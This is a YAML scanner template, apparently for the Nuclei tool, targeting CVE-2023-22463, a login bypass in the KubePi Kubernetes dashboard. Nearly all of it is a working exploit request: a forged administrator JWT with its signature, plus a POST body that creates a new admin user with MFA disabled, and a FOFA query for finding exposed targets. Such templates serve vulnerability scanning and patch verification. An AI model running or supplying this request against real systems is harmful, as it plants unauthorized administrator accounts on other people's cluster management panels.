id: CVE-2023-22463

info:
  name: KubePi JwtSigKey login bypassauth vulnerability(KubePi JwtSigKey 登陆绕过漏洞)
  author: linfeng7z
  severity: high
  tags: kubepi,bypassauth
  metadata:
    fofa-query: 'KubePi'

requests:
  - raw:
      - |
        POST /kubepi/api/v1/users HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
        accept: application/json
        Accept-Encoding: gzip, deflate
        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
        
        {
          "authenticate": {
               "password": "{{randstr}}"
          },
          "email": "{{randstr}}@qq.com",
          "isAdmin": true,
          "mfa": {
                  "enable": false
           },
          "name": "{{randstr}}",
          "nickName": "{{randstr}}",
          "roles": [
               "Supper User"
          ]
        }

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
        condition: and